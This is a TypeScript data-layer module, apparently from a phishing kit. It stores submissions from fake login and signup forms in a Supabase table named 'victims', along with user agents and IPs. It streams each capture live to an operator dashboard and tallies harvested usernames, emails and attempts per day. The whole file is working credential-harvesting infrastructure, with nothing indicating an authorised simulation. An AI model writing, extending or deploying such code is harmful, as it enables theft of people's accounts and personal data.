import { createClient } from '@supabase/supabase-js';
import { VictimAttempt } from '../types/database';

const supabaseUrl = import.meta.env.VITE_SUPABASE_URL || 'https://placeholder.supabase.co';
const supabaseKey = import.meta.env.VITE_SUPABASE_ANON_KEY || 'placeholder-key';

export const supabase = createClient(supabaseUrl, supabaseKey);

// Real-time subscription for dashboard
export const subscribeToAttempts = (
  callback: (payload: { new: VictimAttempt; eventType: 'INSERT' }) => void
) => {
  return supabase
    .channel('attempts')
    .on('postgres_changes', 
        { event: 'INSERT', schema: 'public', table: 'victims' }, 
        callback)
    .subscribe();
};

// Database operations
export const captureAttempt = async (data: Omit<VictimAttempt, 'id' | 'created_at'>) => {
  try {
    const { error } = await supabase
      .from('victims')
      .insert([{
        ...data,
        ip_address: 'CAPTURED_ON_SERVER', // IP will be captured by RLS policy
        user_agent: navigator.userAgent || 'Unknown'
      }]);
    
    if (error) {
      console.error('Error capturing attempt:', error);
      throw error;
    }

    // Trigger real-time update
    const channel = supabase.channel('attempts');
    channel.send({
      type: 'broadcast',
      event: 'new_attempt',
      payload: data
    });

    return true;
  } catch (error) {
    console.error('Error capturing attempt:', error);
    throw error;
  }
};

export const getAttempts = async (limit = 100, offset = 0) => {
  const { data, error } = await supabase
    .from('victims')
    .select('*')
    .order('created_at', { ascending: false })
    .range(offset, offset + limit - 1);
  
  if (error) throw error;
  return data as VictimAttempt[];
};

export const getStats = async () => {
  const { data: attempts, error } = await supabase
    .from('victims')
    .select('attempt_type, created_at, username, email');
  
  if (error) throw error;
  
  const today = new Date().toDateString();
  const todayAttempts = attempts?.filter(attempt => 
    new Date(attempt.created_at).toDateString() === today
  ).length || 0;
  
  const uniqueUsers = new Set();
  attempts?.forEach(attempt => {
    if (attempt.username) uniqueUsers.add(attempt.username);
    if (attempt.email) uniqueUsers.add(attempt.email);
  });
  
  return {
    totalAttempts: attempts?.length || 0,
    uniqueUsers: uniqueUsers.size,
    loginAttempts: attempts?.filter(a => a.attempt_type === 'login').length || 0,
    signupAttempts: attempts?.filter(a => a.attempt_type === 'signup').length || 0,
    todayAttempts
  };
};